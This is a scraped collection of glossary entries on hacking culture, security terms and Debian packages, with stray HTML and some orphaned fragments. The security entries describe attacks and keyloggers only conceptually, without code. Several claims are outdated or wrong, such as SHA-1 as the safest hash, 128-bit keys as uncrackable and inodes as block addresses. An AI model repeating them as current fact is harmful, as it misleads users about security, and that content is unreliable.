>&#13;n. 1. The belief that information-sharing is a powerful positive good, and that it is an ethical duty of hackers to share their expertise by writing open-source and facilitating access to information and to computing resources wherever possible. 2. The belief that system-cracking for fun and exploration is ethically OK as long as the cracker commits no theft, vandalism, or breach of confidentiality. Both of these normative ethical principles are widely, but by no means universally, accepted among hackers. Most hackers subscribe to the hacker ethic in sense 1, and many act on it by writing and giving away open-source software. A few go further and assert that all information should be free and any proprietary control of it is bad; this is the philosophy behind the GNU project. Sense 2 is more controversial: some people consider the act of cracking itself to be unethical, like breaking and entering. But the belief that `ethical' cracking excludes destruction at least moderates the behavior of people who see themselves as `benign' crackers (see also samurai). On this view, it may be one of the highest forms of hackerly courtesy to (a) break into a system, and then (b) explain to the sysop, preferably by email from a superuser account, exactly how it was done and how the hole can be plugged -- acting as an unpaid (and unsolicited) tiger team. The most reliable manifestation of either version of the hacker ethic is that almost all hackers are actively willing to share technical tricks, software, and (where possible) computing resources with other hackers. Huge cooperative networks such as Usenet, FidoNet and Internet (see Internet address) can function without central control because of this trait; they both rely on and reinforce a sense of community that may be hackerdom's most valuable intangible asset.

>&#13;The word "harden" implies putting a shell around a computer in order to protect it from intruders. In order to harden a system, you should consider the following techniques: Patch the OS with the latest security fixes. For example, when the "ping-of-death" DoS attack came out, many people needed to patch their TCP/IP stacks to defend against it. Patch the exposed services with the latest security fixes. For example, many third-party mail servers have been vulnerable to buffer overflow exploits. These are normally fixed a few weeks after being published in the hacker community. Therefore, you need to regularly check with the software vendor for the latest patch. Remove all defaults. In order to make their software easy-to-use, vendors include default accounts, default passwords, and samples. However, these can generally be exploited by hackers. You MUST read security guidelines for the particular OS or software package (especially web-server) and carefully remove these defaults/samples, or your box WILL be hacked. For example, most Microsoft IIS 4 web-servers can be compromised with either the .htr buffer overflow or RDO exploits, because webmasters forget (or don't know) to turn them off. Remove all unnecessary services. For example, most Sun Solaris based systems can be hacked through the RPC services. Install packet filtering software. From Hacking-Lexicon

This "hash" has two important properties: It is "one-way"; given a hash, somebody cannot figure out what input message generated the output hash. It is unique; there is more chance of an asteroid hitting the earth and wiping out all life than two messages accidentally hashing to the same value. No two messages should produce the same Example: Some common uses of hashes are: Creating an encryption key from a text password. Creating a unique "fingerprint" of a message that is then encrypted with a private key in order to sign a message. Create unique fingerprints of files in order to detect when they have changed. Example: The program "tripwire" detects intrusions by calculating a hash of all programs/binaries. On a regular basis, it recalculates the hash. If a file has changed, then the hash will also have changed. Tripwire then "trips" whenever the latest calculated hash of the file does not match the one stored in its database. Example: Some common hash algorithms are: SHA-1 If you need to choose a hash algorithm, this is probably the best one to choose (unless speed is the paramount concern). Of the most popular hash algorithms, this is currently (year 2001) considered to be the most secure. MD5 In the year 2001, more data is probably being hashed by MD5 than any other algorithm. However, a lot of people recommend moving to SHA-1 because of weaknesses discovered in MD5. RIPEMD MD4 A historically significant hash algorithm, but useless by today's standards.

This means that your PC can emulate an IBM mainframe processor. The mainframe can range from a 360 to a z900 - running in "System/370" mode, "ESA/390" mode, or "z/Architecture" mode. Hercules executes S/370, ESA/390, and z/Architecture instructions and channel programs. It emulates mainframe I/O devices by using PC devices. For example, 3390 DASD devices are emulated by large files on your hard disk, and local 3270 screens are emulated by tn3270 sessions. Hercules implements only the raw S/370, ESA/390, and z/Architecture instruction set; it does not provide any operating system facilities. This means that you need to provide an operating system or standalone program which Hercules can load from an emulated disk or tape device. You will have to use a free software operating system such as Linux, write the operating system or standalone program yourself, obtain a license from IBM to run one of their operating systems on your PC, or use IBM programs and operating systems which have been placed in the public domain. Virtual networking can be accomplished using the TUN/TAP driver in 2.2 and 2.4 kernels.  For older kernels, try the vmnet package.

</B

><P
>&#13;In computer science, the word hexadecimal means base-16 numbers. These are numbers that use digits in the range: 0123456789ABCDEF. In the C programming language (as well as Java, JavaScript, C++, and other places), hexadecimal numbers are prefixed by a 0x. In this manner, one can tell that the number 0x80 is equivalent to 128 decimal, not 80 decimal. Key point: Hex is so important because 4-bits have 16-possible combinations. Therefore, a 4-bit value can be represented by a single hex digit. In this manner, every byte (8-bits) can be represented by two hex digits. Key point: Script kiddies tend to dismiss hexadecimal as one of those "unnecessary details". In reality, you must be able to comfortably do hex math in your head, and freely convert with binary. You should also be able to interpret hexdumps, where a block of data is dumped out into columns of hex numbers. A tutorial for this is at http://www.robertgraham.com/pubs/sniffing-faq.html#hexadecimal. Key point: My mother, an otherwise avowed computerphobe, calculates her age in hex.

>&#13;n. Base 16. Coined in the early 1960s to replace earlier `sexadecimal', which was too racy and amusing for stuffy IBM, and later adopted by the rest of the industry. Actually, neither term is etymologically pure. If we take `binary' to be paradigmatic, the most etymologically correct term for base 10, for example, is `denary', which comes from `deni' (ten at a time, ten each), a Latin `distributive' number; the corresponding term for base-16 would be something like `sendenary'. "Decimal" comes from the combining root of `decem', Latin for 10. If wish to create a truly analogous word for base 16, we should start with `sedecim', Latin for 16. Ergo, `sedecimal' is the word that would have been created by a Latin scholar. The `sexa-' prefix is Latin but incorrect in this context, and `hexa-' is Greek. The word `octal' is similarly incorrect; a correct form would be `octaval' (to go with decimal), or `octonary' (to go with binary). If anyone ever implements a base-3 computer, computer scientists will be faced with the unprecedented dilemma of a choice between two correct forms; both `ternary' and `trinary' have a claim to this throne.

>&#13;n. A software or hardware feature included in order to simplify later additions or changes by a user. For example, a simple program that prints numbers might always print them in base 10, but a more flexible version would let a variable determine what base to use; setting the variable to 5 would make the program print numbers in base 5. The variable is a simple hook. An even more flexible program might examine the variable and treat a value of 16 or less as the base to use, but treat any other number as the address of a user-supplied routine for printing a number. This is a hairy but powerful hook; one can then write a routine to print numbers as Roman numerals, say, or as Hebrew characters, and plug it into the program through the hook. Often the difference between a good program and a superb one is that the latter has useful hooks in judiciously chosen places. Both may do the original job about equally well, but the one with the hooks is much more flexible for future expansion of capabilities (EMACS, for example, is all hooks). The term `user exit' is synonymous but much more formal and less hackish.  From Jargon Dictionary

For many years, before Microsoft, IBM was the company hackers loved to hate. But everything changes. In the 1980s IBM had its own troubles with Microsoft. In the late 1990s IBM re-invented itself as a services company, began to release open-source software through its AlphaWorks group, and began shipping Linux systems and building ties to the Linux community.

>&#13;Contrast: The term "information security" distinguishes itself from "physical security". Key point: A common model used to describe security is the OSI/ISO/IEC 10181 standard.

(antonym: repudiation/renounce/reject) confidentiality Prevent unauthorized disclosure of information. (antonym: disclosure) integrity Making sure that things cannot be corrupted. (antonym: corruption, tampering). audits and alarms Track what is happening. availability (antonym: Denial-of-Service) accountability Making sure that people can be held responsible for their actions. (antonym: anonymity). This includes finding out who violated security policies, as well as simple things as charging departments for their use of network resources. Key point: The most common threats are: disclosure Information was leaked to an unauthorized person. integrity violation Data was altered, such as an account balance that was changed. masquerading/forgery Somebody pretends to be somebody else, or generates a message pretending to be from somebody else. denial-of-service insider attacks From people you trust. backdoors/trojans Key point: The fields of infosec and hacking are not necessarily related. This is a little confusing. Infosec is the field of assuring that information is secure. Hacking is the field of breaking rules. For example, following infosec best practices, you can validate that a server is secure, data is encrypted, and that only authenticated users can gain access. However, a hacker executing a buffer overflow exploit gains access bypassing all the security measures. Contrast: The military has a number of terms related to INFOSEC. They include: COMSEC - communications security Describes the procedures designed to secure communications from the enemy. The antonym is COMINT. From Hacking-Lexicon

>&#13;IP Masquerade is a networking function in Linux similar to the one-to-many (1:Many) NAT (Network Address Translation) servers found in many commercial firewalls and network routers. For example, if a Linux host is connected to the Internet via PPP, Ethernet, etc., the IP Masquerade feature allows other "internal" computers connected to this Linux box (via PPP, Ethernet, etc.) to also reach the Internet as well. Linux IP Masquerading allows for this functionality even though these internal machines don't have an officially assigned IP address. MASQ allows a set of machines to invisibly access the Internet via the MASQ gateway. To other machines on the Internet, the outgoing traffic will appear to be from the IP MASQ Linux server itself. In addition to the added functionality, IP Masquerade provides the foundation to create a HEAVILY secured networking environment. With a well built firewall, breaking the security of a well configured masquerading system and internal LAN should be considerably difficult to accomplish.

>&#13;n. The mother of all networks. First incarnated beginning in 1969 as the ARPANET, a U.S. Department of Defense research testbed. Though it has been widely believed that the goal was to develop a network architecture for military command-and-control that could survive disruptions up to and including nuclear war, this is a myth; in fact, ARPANET was conceived from the start as a way to get most economical use out of then-scarce large-computer resources. As originally imagined, ARPANET's major use would have been to support what is now called remote login and more sophisticated forms of distributed computing, but the infant technology of electronic mail quickly grew to dominate actual usage. Universities, research labs and defense contractors early discovered the Internet's potential as a medium of communication between humans and linked up in steadily increasing numbers, connecting together a quirky mix of academics, techies, hippies, SF fans, hackers, and anarchists. The roots of this lexicon lie in those early years. Over the next quarter-century the Internet evolved in many ways. The typical machine/OS combination moved from DEC PDP-10s and PDP-20s, running TOPS-10 and TOPS-20, to PDP-11s and VAXes and Suns running Unix, and in the 1990s to Unix on Intel microcomputers. The Internet's protocols grew more capable, most notably in the move from NCP/IP to TCP/IP in 1982 and the implementation of Domain Name Service in 1983. It was around this time that people began referring to the collection of interconnected networks with ARPANET at its core as "the Internet". The ARPANET had a fairly strict set of participation guidelines - connected institutions had to be involved with a DOD-related research project. By the mid-80s, many of the organizations clamoring to join didn't fit this profile. In 1986, the National Science Foundation built NSFnet to open up access to its five regional supercomputing centers; NSFnet became the backbone of the Internet, replacing the original ARPANET pipes (which were formally shut down in 1990). Between 1990 and late 1994 the pieces of NSFnet were sold to major telecommunications companies until the Internet backbone had gone completely commercial. That year, 1994, was also the year the mainstream culture discovered the Internet. Once again, the killer app was not the anticipated one - rather, what caught the public imagination was the hypertext and multimedia features of the World Wide Web. Subsequently the Internet has seen off its only serious challenger (the OSI protocol stack favored by European telecom monopolies) and is in the process of absorbing into itself many of the proprietary networks built during the second wave of wide-area networking after 1980. It is now (1996) a commonplace even in mainstream media to predict that a globally-extended Internet will become the key unifying communications technology of the next century.

>&#13;Unlike a compiled program, which is converted from source code to an executable one time, by a compiler, and then run from its binary form, an interpreted program is converted to binary on the fly each time it is run, by an interpreter program. Interpreted languages (and thus their programs) tend to be slower than compiled and p-code languages/programs, and generally have limited authorization to low-level operating system functions or direct hardware access. On the other hand, they do not require compilers (which can be expensive), are often included along with operating systems, and are usually easier to program than compiled languages. Examples of interpreted languages are BASIC, Perl, Python and REXX/Object REXX. From I-gloss

"The Matrix" had more plot holes than this, and it still was a hit.) You do this by melting lines in the ice with Special High-Tech GNU Tools. Once 80% or more of the iceberg is gone, the remaining chunks are small enough for shipping.

>&#13;A UNIX command that identifies the user account under which it is executed, including UID, GID, groups, and associated names. Key point: This is often the first command a hacker will run on the system when the hacker breaks in remotely. The hacker will remotely compromise a service that is running under either root account, a special account setup for that service (e.g. the majordomo service runs under a user account called "majordomo"), or a user's account. The hacker is hoping they have achieved root access immediately. If not, the hacker will have to run a local exploit in order to elevate privileges. The other popular command hackers might execute is id. Example: Running id as root on one of my systems results in: uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy) From Hacking-Lexicon

This wheel button acts both as a standard button (by pressing it), and a wheel, which under MS Windows may be used for scrolling windows around. This program supports the wheel scrolling operation by one of two means: 1. Some newer X servers support mapping the wheel to buttons    4 and 5, which imwheel then captures and supports, 2. Using a patched version of gpm, the normal mouse events are    passed on to the X server through /dev/gpmdata (gpm's standard    "repeater" mode), and in addition wheel events are sent to another    pipe, /dev/gpmwheel. imwheel picks up these events, and translates    them.

>&#13;'init' process is the first user level process started by the kernel. init has many important duties, such as starting getty (so that users can log in), implementing run levels, and taking care of orphaned processes. This chapter explains how init is configured and how you can make use of the different run levels. init is one of those programs that are absolutely essential to the operation of a Linux system, but that you still can mostly ignore. Usually, you only need to worry about init if you hook up serial terminals, dial-in (not dial-out) modems, or if you want to change the default run level. When the kernel has started (has been loaded into memory, has started running, and has initialized all device drivers and data structures and such), it finishes its own part of the boot process by starting a user level program, init. Thus, init is always the first process (its process number is always 1). The kernel looks for init in a few locations that have been historically used for it, but the proper location for it is  /sbin/init. If the kernel can't find init, it tries to run /bin/sh, and if that also fails, the startup of the system fails. When init starts, it completes the boot process by doing a number of administrative tasks, such as checking filesystems, cleaning up /tmp, starting various services, and starting a getty for each terminal and virtual console where users should be able to log in. After the system is properly up, init restarts getty for each terminal after a user has logged out (so that the next user can log in). init also adopts orphan processes: when a process starts a child process and dies before its child, the child immediately becomes a child of init. This is important for various technical reasons, but it is good to know it, since it makes it easier to understand process lists and process tree graphs. init itself is not allowed to die. You can't kill init even with SIGKILL. There are a few variants of init available. Most Linux distributions use sysvinit (written by Miquel van Smoorenburg), which is based on the System V init design. The BSD versions of Unix have a different init. The primary difference is run levels: System V has them, BSD doesn't. From Linux Administrator's Guide

><P
>&#13;An inode is the address of a disk block. When you see the inode information through ls, ls prints the address of the first block in the file. You can use this information to tell if two files are really the same file with different names (links). A file has several components: a name, contents, and administrative information such as permissions and modification times. The administrative information is stored in the inode (over the years, the hyphen fell out of "i-node"), along with essential system data such as how long it is, where on the disc the contents of the file are stored, and so on. There are three times in the inode: the time that the contents of the file were last modified (written); the time that the file was last used (read or executed); and the time that the inode itself was last changed, for example to set the permissions. Altering the contents of the file does not affect its usage time and changing the permissions affects only the inode change time. It is important to understand inodes, not only to appreciate the options on ls, but because in a strong sense the inodes are the files. All the directory hierarchy does is provide convenient names for files. The system's internal name for the file is its i-number: the number of the inode holding the file's information.

>&#13;integrity
</B
></DT
><DD
><P
>&#13;One of the major areas of infosec, integrity is the area concerned with making sure that messages/information are "correct" and haven't been subtly changed or tampered with by an adversary. Analogy: We write the dollar amount on personal checks both as numbers as well as words. This prevents somebody from altering the value, such as adding an extra digit to the number in order to extract $1000 from you rather than the authorized $100. Key point: We use cryptographic hashes as a way of fingerprinting documents and detecting when they are changed. The two most popular hashes are SHA-1 and MD5. Key point: Typical attacks against integrity include modification, insertion, deletion, and replay of information. Contrast: The terms integrity and authenticity are widely used to mean the same thing. In other situations, they have subtly different meanings (especially law). The term integrity generally describes defenses against malicious alteration of a message once it has been sent, whereas authenticity also implies some validation of the sender of the message to protect against forgeries. Contrast: Another way looking at integrity is system integrity. The concern is maintaining the integrity of the computer itself, rather than a message that goes across the wire. In this context, the goals are to prevent files from being modified or programs from being installed on the system. One of the focuses of system integrity is making sure that legitimate, authorized users do not make unauthorized modifications to the system. Programs like tripwire check the integrity of systems by maintaining a table of hashes for all files, and detecting which files change. See also: Integrity is often mentioned along with other key security concepts such as confidentiality, authentication, and non-repudiation. From Hacking-Lexicon

>&#13;interactive logon (network logon)
</B

><P
>&#13;Microsoft Windows has two destinctive ways of logging onto a machine. An interactive logon is where you log onto your machine locally (sitting in front of it), whereas a network logon is the process of connecting to the file server remotely across the network. Normally, both logons happen simultaneously after entering the username/password only once, so users typically don't perceive much difference between the two logons. Key point: Network logons can be disabled for administrators. This prevents people from stealing passwords and remotely administering the machine. This makes security easier because the server can be controlled via physical security. Contrast: Unix has similar concepts. A local logon is through the "console". Often, root access will be denied to remote logons. Both Windows and Unix have the concept of remotely logging on via one user account, then using that account to locally upgrade to root/administrator. From Hacking-Lexicon

>&#13;Securely initializes IP Masquerade forwarding/firewalling This package contains scripts to initialize IP Masquerade for use as a firewall.  IP Masquerade is a feature of Linux that allows an entire network of computers to be connected to another network (usually the Internet) with only one network address on the other network.  IP Masquerade is often referred to as NAT (Network Address Translation) on other platforms. By default, this package configures the system as a basic forwarding firewall, with IP spoofing and stuffed routing protection.  The firewall will allow hosts behind the firewall to get to the Internet, but not allow connections from the Internet to reach the hosts behind the firewall. However, ipmasq now features a very flexible framework where you can override any of the predefined rules if you so choose.  It also allows you to control if the rules are reinterpreted when pppd brings a link up or down. This package should be installed on the firewall host and not on the hosts behind the firewall. IP Masquerade requires the kernel to be compiled with masquerading support (please see documentation for specific kernel options required). From Debian 3.0r0 APT

>&#13;IP packet filter administration tools for 2.4.4+ kernels netfilter and iptables are the framework inside the  Linux 2.4.x kernel which enable packet filtering, network address translation (NAT) and other packet mangling. netfilter is a set of hooks inside the linux 2.4.x kernel's network stack which allows kernel modules to register callback functions called every time a network packet traverses one of those hooks. iptables is a generic table structure for the definition of rulesets. Each rule within an IP table consists out of a number of classifiers (matches) and one connected action (target). netfilter, iptables and the connection tracking as well as the NAT subsystems together build the whole framework. IMPORTANT NOTES: System security is a discipline that cannot be achieved by simply installing the iptables package -- the iptables package is NOT a firewall package.

>&#13;Most important ISDN-related packages and utilities. Note that for an external ISDN adapter, you do NOT need this package or any of the related ones. This is only for use with an internal ISDN adapter. Choosing this package will select the most frequently used components. The current version of isdnutils is split up into component packages, to make it easier to fine-tune what is installed; hardly anyone needs everything. However, it's not possible to automatically select what is needed This is a transitional package to ease upgrading, and choosing this selects the most important new packages. After upgrading, this package can be safely removed. The component packages selected by this are:  isdnutils-base   basic set of ISDN utilities.  ipppd            for networking over ISDN with syncPPP.  isdnlog          for logging ISDN calls (and much more).  isdnutils-xtools for X ISDN apps (currently only xisdnload and xmonisdn)  isdnvboxserver   ISDN answering machine, things needed on the server system.  isdnvboxclient   ISDN answering machine, client side (vbox). Not selected (although dselect will suggest some) are:  isdnutils-doc    for extensive documentation (basic docs are of course                   included with each package).  isdneurofile     file transfer over ISDN with the special eurofile protocol.  pppdcapiplugin   a plugin for the normal ppp daemon that uses CAPI to                   communicate over ISDN.  isdnactivecards  firmware for mostly active ISDN cards, and other related                   tools.  libcapi20        library package needed by CAPI applications (will be                   selected automatically when needed).

As of February 2001, only old-style dictionaries are available, because the dictionaries-common standards and package have not been finalized.

Most programmers confronted with JCL simply copy a working file (or card deck), changing the file names.

It is reported that hackers at IBM itself sometimes sing "Who's the breeder of the crud that mangles you and me?

>&#13;An object-oriented language originally developed at Sun by James Gosling (and known by the name "Oak") with the intention of being the successor to C++ (the project was however originally sold to Sun as an embedded language for use in set-top boxes). After the great Internet explosion of 1993-1994, Java was hacked into a byte-interpreted language and became the focus of a relentless hype campaign by Sun, which touted it as the new language of choice for distributed applications. Java is indeed a stronger and cleaner design than C++ and has been embraced by many in the hacker community - but it has been a considerable source of frustration to many others, for reasons ranging from uneven support on different Web browser platforms, performance issues, and some notorious deficiencies of some of the standard toolkits (AWT in particular). Microsoft's determined attempts to corrupt the language (which it rightly sees as a threat to its OS monopoly) have not helped. As of 1999, these issues are still in the process of being resolved. Despite many attractive features and a good design, it is difficult to find people willing to praise Java who have tried to implement a complex, real-world system with it (but to be fair it is early days yet, and no other language has ever been forced to spend its childhood under the limelight the way Java has). On the other hand, Java has already been a big win in academic circles, where it has taken the place of Pascal as the preferred tool for teaching the basics of good programming to the next generation of hackers.

>&#13;Rip and encode CDs with one command Jack has been developed with one main goal: making MP3s or OGGs without having to worry. There is nearly no way that an incomplete rip goes unnoticed, e.g. jack compares WAV and OGG file sizes when continuing from a previous run. Jack also checks your HD space before doing anything (even keeps some MB free). Jack is different from other such tools in a number of ways:  - it supports different rippers and encoders  - it is very configurable  - it doesn't need X  - it can "rip" virtual CD images like the ones created by cdrdao  - when using cdparanoia, cdparanoia's status information is displayed    for all tracks, so you can see if something went wrong  - it uses sophisticated disk space management, i.e. it schedules it's    ripping/encoding processes depending on available space.  - freedb query, file renaming and id3 tagging  - it can resume work after it has been interrupted. If all tracks have    been ripped, it doesn't even need the CD anymore, even if you want    to do a freedb query.  - it can do a freedb query based on OGGs alone, like if you don't    remember from which CD those OGGs came from.  - freedb submissions From Debian 3.0r0 APT

People who want to download the image do so by telling the jigdo download tool to process one ".jigdo" file; using it, jigdo downloads the parts and reassembles the image. jigdo-file is used to prepare the files for download.

Unlike other compilers, Jikes accepts the Java language only as specified: not as a subset, variant, or superset. In addition to strictly adhering to specifications, Jikes is faster than most compilers and can compute the complete dependency relations in program files. This allows for the generation of dependency makefiles suitable for use with make. Jikes can also be run in incremental mode: after the initial compilation, Jikes waits until prompted, determines which files have been changed, and then does the minimal amount of work needed to bring the class files into a complete and consistent state. This cycle can be repeated until the q command is entered to end the compilation. From Debian 3.0r0 APT

>&#13;playlist editor / player frontend Juice is a frontend for mpg123 and other players. It provides a nifty dialog-based playlist editor. It basically allows you to browse through your files in a "Midnight Commander"-like fashion. The MP3's you select are treated as a playlist which can be shuffled, rearranged, saved, etc. In order to play audio files, two player interfaces are provided. The mpg123-specific interface uses the remote protocol of mpg123 (This feature was introduced in version 0.59r in order to accommodate generic frontends.) The other player frontend is generic and allows for any player to be used. This is useful if you do not want to limit the functionality of juice to MP3's. Please note that this generic frontend is still in early beta phase and is pretty buggy. Of course juice comes with all the bells &#38; whistles you'd expect from a quality application and has (among others) full integrated help functionality as well as full dialog based configuration file editor.

>&#13;Client for Kascade, a distributed Open directory search-engine Kascade is a novel type of search-engine, based on the Open directory principle. This means that anyone can structure a small part of the information on the internet, corresponding to their personal interests or expertise. The resulting parts are placed in a large categorical structure that others can browse to search for information. Examples of Open Directory initiatives are Dmoz and Infomarker. In contrast with other Open Directory initiatives, though, the parts that people maintain now reside on their own server. What results is a distributed Open Directory! As with Gnutella, though, there are no fixed central servers. This implies that anyone can start a new structure. Actually any piece can be easily replaced, hopefully leading to competitive improvement.

KDbg can also display Qt 2's QString values, which    are Unicode strings.  * Debugger at your finger tips: The basic debugger functions (step,    next, run, finish, until, set/clear/enable/disable breakpoint) are    bound to function keys F5 through F10. Quick and easy.  * View source code, search text, set program arguments and environment    variables, display arbitrary expressions.  * Debugging of core dumps, attaching to running processes is possible.  * Conditional breakpoints.

>&#13;The core of the operating system. The kernel has complete control over everything that happens. When your computer crashes, it means the kernel has crashed. If only a single program crashes but the rest of the system remains running, then the kernel itself hasn't crashed. The kernel is designed to coordinate among the different components of the operating system, such as disk drive, networking, keyboard, and running programs. Key point: The kernel is responsible for security, preventing one program from one user from breaking into other programs running on the same system. All systems except the older Mac and Windows do not provide this level of security. Key point: The kernel itself does not interact with the user. For example, the word "Linux" really means just the kernel. What we see in Linux distributions is actually the kernel plus a whole bunch of UNIX-like applications built on top of it. Contrast: There are two modes your software might be running in. Kernel mode is running within the context of the kernel itself, and describes not only the kernel but also device drivers. User mode is the context the rest of the software runs in. The key point is that when you are running in kernel mode, you've got access to the entire system and nobody can stop you. However, when you are running in user mode (especially when not logged in as root), then the kernel imposes security on your activity. This means that if you break into a normal HTTP server, you may not actually be able to break into the entire machine. However, newer versions of the Linux kernel are putting things like HTTP servers into the kernel itself (for performance reasons). An exploitable flaw in such services will allow the entire machine to be compromised. From Hacking-Lexicon

>&#13;In cryptography, the value needed to encrypt and/or decrypt something. It is usually a number or a short string less than 20 characters long. Contrast: People are confused as to the difference between a key and a password. A key is a large number whereas a password is simply a series of letters (and possibly digits and punctuation). Since cryptography only uses keys, the password is generally converted to a number through the use of an appropriate mathematical function, like a hash. Public/private keys present a special difficulty in that they contain extremely large, unwieldy numbers that are protected by a separate password. Contrast: There are two types of keys: symmetric keys use the same key for both encryption and decryption asymmetric (aka. public/private key) are produced in pairs, where one key encrypts, but a mirror key must be used to decrypt the message, and somebody with one key cannot figure out the other key. Contrast: A common question deals with the difference between 40-bit and 128-bit encryption in web browsers like Netscape. The answer is that the most obvious way to break the encryption and read the plain text is to simply try all possible keys. A 40-bit key has roughly one trillion (1,000,000,000,000) combinations. It could take your computer several weeks to try all these combinations. The implication: the average person only needs a few weeks to decrypt any message you send across the wire with a 40-bit browser, should they manage to sniff it from the wire. Every extra bit of key length means the key will take twice as long to crack. Therefore, if a system takes one week to crack a 40-bit key, it will take two weeks to crack a 41-bit key. Therefore, a 128-bit key will take 2^(128-40) times longer to crack than a 40-bit key (i.e. 309,485,009,821,345,068,724,781,056 times longer). Example: The following table shows the relative difficulty in cracking keys (circa year 2000). Bits Difficulty 8 paper and pencil (puzzle appears in Sunday paper) 16 tiny computer 32 your desktop computer 40 a few computers and a fair amount of time 56 custom hardware 64 distributed.net (a hundred thousand machine cranking away for a couple of years) 80 government agencies (NSA, CIA) 128 not crackable at the current time 256 quantum computers Key point: Moore's Law breaks all cryptosystems, eventually. This, and only this, is why DES has become obsolete. Note: 40-bit and 128-bit keys mean the RC4 algorithm used within web-browsers to talk to web servers via SSL. The U.S. restricts export of all software whose keys are greater than 40-bits in order to be able to spy on foreigners (ostensibly only in a military engagement). Key point: You can classify keys according to their lifetimes: In PKI, "session keys" are randomly generated and last only the lifetime of the connection. The public/private keys are used to exchange them so that people eavesdropping on the wire cannot figure out what they are. Longer term keys are often based upon a hash of a password and are explicitly generated by the user. An example would be a user who encrypts a file with a key. Key point: The Kerckhoff principle states that cryptography should be based upon the assumption that the enemy will discover all the details of your system. Therefore, all the security of the system should be held within the key. Not only that, the idea is that the details of the system should be actively published and publicized in the hopes that people will analyze the system, discover them, and publish the weaknesses before the enemy gets a chance to. All the best cryptosystems have been well published and analyzed in public forums. From Hacking-Lexicon

>&#13;A program that runs in the background that records all the keystrokes. Key point: Once keystrokes are logged, they are shipped raw to the hacker. The hacker then peruses them carefully in the hopes of either finding passwords, or possibly other useful information that could be used to compromise the system or be used in a social engineering attack. For example, a key logger will reveal the contents of all e-mail composed by the user. Key point: Keylog programs are commonly included in rootkits and remote administration trojans. Key point: You can also purchase hardware devices that plug-in between the keyboard and the main system (for PCs). These are OS independent, they simply start recording, then the hacker can retrieve the device and instruct it to simply spit out all the characters back again on the hackers system.

The key features of the architecture include the following:  - A complete high-availability service infrastructure prevents you    from having to assemble an infrastructure from disparate    components.  - An extensible service-configuration framework enables you to    easily integrate a wide variety of applications.  - An exceptional data integrity guarantee differentiates the    software from other contemporary offerings from the Linux    community.  Because of this guarantee, a Kimberlite cluster    provides a solid foundation for highly-available data services,    such as network-exported databases and NFS file systems, and is    ideal as the data tier for dynamic web content.  - Services fail over automatically when problems occur, without    requiring manual intervention by system administrators.  - A command line user interface and a web-based graphical user    interface enable you to monitor and manage the cluster.  - A cluster utilizes commodity hardware and storage options, such as    SCSI and FibreChannel.

It allows you to define, store and operate on trees with typed nodes. Each type of node has a specific number of sons, and expects these sons to have specific types.  The most popular example of such trees are syntax trees. The nodes are defined in a Yacc-like fashion.  The tree can be unparsed (ie. treewalk) and rewritten (ie. term substitution). Kimwitu++ gives you powerful pattern matching for specifying unparse and rewrite rules. Kimwitu++ is an extension to C++. It introduces Yacc-like node definitions, the unparse and rewrite rules, and extensions for pattern matching within functions. It will translate its input files into pure C++. To build the tree you might use a parser generated with Bison, but you are free to use other tools.  There also exists Kimwitu (also packaged for Debian) which interfaces with C instead of C++ which can also be used in C++ projects, but Kimwitu++ has some extensions one might consider useful.

You must move your pointer to certain areas within the square. Upon clicking, a new border is constructed at a relatively quick pace. You can change the direction of the borders by 90 degrees as well. Ultimately, you must force the ball to bounce around in a smaller, and smaller area as time goes by without the ball ever touching the borders as they are being constructed. If a ball touches a certain part of the border as it is being built, the game is over.

Best of all, It reads and writes the vCalendar file format NATIVELY (please see http://www.imc.org/pdi for more information), which is now an industry-wide personal data interchange format.

I don't like TCL/TK very much so I decided to create a similar but more extended application for my favorite desktop environment : KDE. KreateCD itself uses some command line applications as base applications and provides a comfortable and very intuitive user interface which should be usable by people who don't have any experiences with Linux at all. The main features of KreateCD are:  o Intuitive user interface  o Supports mastering of ISO-9660 CD-ROM tracks  o Is able to read .WAV audio files  o Easy to use CD copy function  o Some useful features to edit audio tracks before you write it to CD.    (volume boosting, balance and range selection)  o Audio playback From Debian 3.0r0 APT

>&#13;Sokoban game for KDE The first sokoban game was created in 1982 by Hiroyuki Imabayashi at the Japanese company Thinking Rabbit, Inc. "Sokoban" is japanese for "warehouse keeper". The idea is that you are a warehouse keeper trying to push crates to their proper locations in a warehouse. The problem is that you cannot pull the crates or step over them. If you are not careful, some of the crates can get stuck in wrong places and/or block your way. It can be rather difficult just to solve a level. But if you want to make it even harder, you can try to minimise the number of moves and/or pushes you use to solve the level. To make the game more fun for small kids (below 10 years or so), some collections with easier levels are also included in KSokoban. These are marked (easy) in the level collection menu. Of course, these levels can be fun for adults too, for example if you don't want to expose yourself to too much mental strain. From Debian 3.0r0 APT

Therefore, if your password was "RobertGraham.com", under LAN Manager it would be the same as "ROBERTG RAHAM.C". Whereas new products like Win98, WinNT, and SAMBA support newer/stronger authentication methods, the need for backwards compatibility often exposes the LAN Manager password, which can easily be cracked.

>&#13;LDAP stands for Lightweight Directory Access Protocol. As the name suggests, it is a lightweight client-server protocol for accessing directory services, specifically X.500-based directory services. LDAP runs over TCP/IP or other connection oriented transfer services. LDAP is defined in RFC2251 "The Lightweight Directory Access Protocol (v3). A directory is similar to a database, but tends to contain more descriptive, attribute-based information. The information in a directory is generally read much more often than it is written. Directories are tuned to give quick-response to high-volume lookup or search operations. They may have the ability to replicate information widely in order to increase availability and reliability, while reducing response time. When directory information is replicated, temporary inconsistencies between the replicas may be OK, as long as they get in sync eventually. There are many different ways to provide a directory service. Different methods allow different kinds of information to be stored in the directory, place different requirements on how that information can be referenced, queried and updated, how it is protected from unauthorized access, etc. Some directory services are local, providing service to a restricted context (e.g., the finger service on a single machine). Other services are global, providing service to a much broader context. From LDAP-Linux-HOWTO

Former versions docussed on home-brew hardware connected to the serial and parallel port. Current versions of LIRC also support a varity of other hardware. The most important part of LIRC is the lircd dameon that will decode the IR signals received by the device drivers and provide information on a socket. It will also provide the information on a socket. It will also accept commands for IR signals to be sent if the hardware suports this. The second daemon program called lircmd will connect to lircd and traslate the decoded IR signals to mouse movements. For example, you can configure X to use your remote control as a remote input device. The user space applications allow you to control your computer with your remote control. You can send X events to applications, start programs and much more on just one button press. The possible applications are obvious: Infra-red mouse, remote control for your TV tuner card or CD-ROM, shutdown by remote, program your VCR and/or satellite tuner with your computer, etc. MP3 players are also quite popular.

